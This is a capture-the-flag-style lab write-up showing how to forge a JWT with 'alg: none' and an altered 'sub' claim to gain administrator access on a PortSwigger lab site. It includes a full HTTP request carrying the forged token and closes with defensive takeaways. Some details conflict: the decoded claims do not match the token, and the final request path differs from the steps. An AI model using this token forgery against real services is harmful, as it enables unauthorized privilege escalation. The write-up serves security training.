# JWT Authentication Bypass via `alg: none`

## Step-by-Step (with Reasoning)

---

## 1. Identify the JWT

After logging in, intercept the request:

- GET /my-account

#### Observe the session cookie:


    Cookie: session=eyJraWQiOiJmODAxOTgzNy05YzQxLTRlZWQtYjdmNC0wY2I2ZDNkMTBoMjYiLCJhbGciOiJSUzI1NiJ9.
    eyJpc3MiOiJwb3J0c3dpZ2dLciIsImV4cCI6MTc2OTY4OTM5NCwic3ViIjoid2llbmVyIn0.
    LYNnUG6cKuFQ6q6cf-spgRp1R2VL708-gDOMWV4iARPZkKGKOIDV1j1vjbyLlJmMyfwYXWcodTykpmTbmVkMRchH0J3D3h1RiELXnySEOCLMFE6SU7UKVBGLePumrhxUmlBVSAEqxGCKgTiWSKsGZmndbmsAWRCKG_S2WMgmfeimyPAr2LzyBMEW-BEJz00Tl-
    y63c8D9ytylLax_A21bGyFvgxgtGCpw0JAxoL6r9N9QWjm2xNmvQaxv9H_wedV3XN6ZYmfO4YPNGWS_2tZKVLEVEbP4YVm4QtwMD7Ete7QCNSB4FYeDOSYtf-_vHpEh6cKBMnzS1hOPyTr-yi79A
    This is a JWT used directly for authentication.

## 2. Inspect the JWT Payload
### Steps:
- Double-click the payload in Burp Suite
- Decode it in the Inspector

### Decoded payload:

    json
    Copy code
    {
      "sub": "wiener",
      "iat": 1706523456
    }

### Key Insight
The application trusts the sub claim to determine the authenticated user.

Send this request to Repeater.

## 3. Confirm Access Control
Change the path:

    /my-account ‚Üí /admin

Send the request.

Result:

    Access denied
    /admin is restricted to administrator

‚úî Confirms access control is enforced.

## 4. Modify Identity (Payload Tampering)
Edit the JWT payload:

    "sub": "administrator"

Click Apply changes.

  Normally this should fail unless signature verification is broken.

## 5. Exploit Flawed Signature Verification
Select the JWT header and change:

    "alg": "none"

Click Apply changes.

The server is now being told:

  "This token is unsigned ‚Äî don't verify it."

## 6. Remove the Signature (Critical)
JWT format:

    header.payload.signature

Remove the signature but keep the trailing dot:

    header.payload.

‚úî This produces a valid alg:none JWT.

## 7. Send the Request
Send the modified request:

    GET /admin

### Result
- ‚úÖ Admin panel loads successfully
- ‚úÖ Lab solved

### Why This Works (Exam Gold üß†)
The application:
- Accepts alg: none
- Does not enforce signature verification
 -Fully trusts JWT claims (like sub) for authorization

### Attack Chain
1. JWT used for authentication
2. Algorithm not enforced
3. Signature not required
4. Payload fully attacker-controlled
5. Privilege escalation

### Key Takeaways for Real Pentests
- ‚ùå Never allow alg: none
- ‚úî Enforce expected algorithms on the server
- ‚ùå Do not trust JWT claims blindly
- ‚úî Authorization ‚â† Authentication

### Example Final Request

    GET /my-account?id=administrator HTTP/2
    Host: 0a2200f204fe37ab81697059006f00f5.web-security-academy.net
    Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dLciIsImV4cCI6MTcyNTAxMjcxOSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
    Cache-Control: max-age=0
    Sec-CH-UA: "Chromium";v="127", "Not)A;Brand";v="99"
    Sec-CH-UA-Mobile: ?0
    Sec-CH-UA-Platform: "Linux"
    Accept-Language: en-GB
